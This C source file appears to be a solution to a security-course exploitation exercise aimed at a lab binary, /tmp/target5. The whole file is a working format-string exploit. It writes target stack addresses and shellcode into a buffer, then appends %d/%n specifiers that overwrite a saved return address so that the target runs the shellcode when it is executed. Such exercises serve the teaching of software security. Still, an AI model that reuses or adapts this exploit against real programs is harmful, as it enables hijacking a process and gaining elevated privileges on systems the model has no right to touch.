#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
  char *args[3];
  char *env[1];

  // Exploit string
  int size = 100;
  char sploitstring[size];
  int i;

  // Store address to write to lower 4 bytes of return address
  sploitstring[0] = 0xEC;
  sploitstring[1] = 0xFD;
  sploitstring[2] = 0xFF;
  sploitstring[3] = 0xBF;

  // Dummy 4 bytes
  sploitstring[4] = '1';
  sploitstring[5] = '1';
  sploitstring[6] = '1';
  sploitstring[7] = '1';
  
  // Store address to write to upper 4 bytes of return address
  sploitstring[8] = 0xEE;
  sploitstring[9] = 0xFD;
  sploitstring[10] = 0xFF;
  sploitstring[11] = 0xBF;

  // Inject shellcode
  int ptr = 12;
  for(i = 0; i < strlen(shellcode); i++) {
    sploitstring[ptr] = shellcode[i];
    ptr++;
  }

  // Insert address to shellcode (as decimal; pre-calculated; second %d requires overflowing)
  sploitstring[ptr] = '%';
  ptr++;
  sploitstring[ptr] = '6';
  ptr++;
  sploitstring[ptr] = '4';
  ptr++;
  sploitstring[ptr] = '5';
  ptr++;
  sploitstring[ptr] = '4';
  ptr++;
  sploitstring[ptr] = '7';
  ptr++;
  sploitstring[ptr] = 'd';
  ptr++;
  sploitstring[ptr] = '%';
  ptr++;
  sploitstring[ptr] = 'n';
  ptr++;
  sploitstring[ptr] = '%';
  ptr++;
  sploitstring[ptr] = '5';
  ptr++;
  sploitstring[ptr] = '0';
  ptr++;
  sploitstring[ptr] = '0';
  ptr++;
  sploitstring[ptr] = '8';
  ptr++;
  sploitstring[ptr] = '3';
  ptr++;
  sploitstring[ptr] = 'd';
  ptr++;
  sploitstring[ptr] = '%';
  ptr++;
  sploitstring[ptr] = 'n';
  ptr++;
  

  args[0] = TARGET; args[1] = sploitstring; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
